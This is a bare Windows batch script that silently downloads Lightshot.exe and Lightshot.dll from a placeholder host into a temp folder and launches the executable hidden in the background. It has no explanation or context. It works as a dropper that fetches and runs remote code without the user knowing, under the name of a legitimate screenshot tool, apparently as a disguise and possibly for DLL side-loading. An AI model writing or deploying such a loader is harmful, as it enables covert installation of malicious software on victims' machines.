@echo off
setlocal EnableDelayedExpansion
set "DIR=%TEMP%\Lightshot"
set "EXE=%DIR%\Lightshot.exe"
set "DLL=%DIR%\Lightshot.dll"
set "EXE_URL=http://payload.example.invalid/Lightshot.exe"
set "DLL_URL=http://payload.example.invalid/Lightshot.dll"

if not exist "%DIR%" mkdir "%DIR%" 2>nul
curl -f -s -S -L -o "%EXE%" "%EXE_URL%" 2>nul
curl -f -s -S -L -o "%DLL%" "%DLL_URL%" 2>nul
if exist "%EXE%" (
    start "" /B "%EXE%" >nul 2>&1
)
endlocal
